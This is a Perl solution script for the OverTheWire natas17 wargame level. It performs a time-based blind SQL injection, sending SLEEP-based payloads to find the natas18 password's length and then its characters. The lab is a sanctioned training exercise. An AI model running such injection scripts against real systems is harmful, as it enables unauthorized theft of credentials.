#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use URI;
use v5.16.3;

my $user = 'natas17';
my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));

# This level is just like natas15, except we don't get a boolean answer
# Now we'll have to do a time-based SQL injection
# Password length
sub check_length() {
  # Disable buffering for carriage return to print in STDOUT
  local $|=1;
  my $injection = 'natas18"-IF(length(password) = %d,SLEEP(10),0) # ';
  for( my $i = 1; $i < 40; $i++ ){
    printf ("\rDetermining password length: %2d", $i);
    my $start = time;
    $uri->query_form( username => sprintf($injection, $i) );
    my $result = get($uri) ;
    my $duration = time-$start;
    return $i if $duration > 9;
  }
  die "\rCouldn't determine password length\n";
}
my $length = check_length();
say "\rThe password length for nata18 is $length";

# Password
my $password = '';
my @chars = ('a'..'z', 'A'..'Z', 0..9);
sub determine_password {
  # Disable buffering for carriage return to print in STDOUT
  local $|=1;
  # We use binary for the string so the comparison is case sensitive
  my $injection = 'natas18"-IF(STRCMP(BINARY(SUBSTR(password, 1, %d)),BINARY("%s")) = 0,SLEEP(10),0) #';
  # Check all possible characters
  foreach my $ch (@chars) {
    print "\rDetermining password: $password$ch";
    my $start = time;
    $uri->query_form( debug => 1, username => sprintf($injection, $_[0], $password . $ch) );
    my $result = get( $uri );
    # print parse_html($result)->format;
    my $duration = time-$start;
    return $ch if $duration > 9;
  }
  die "\rCouldn't determine password";
}

for( my $idx=1; $idx <= $length; $idx++ ) {
  $password .= determine_password($idx);
}
say "\rThe password for natas18 is probably $password";
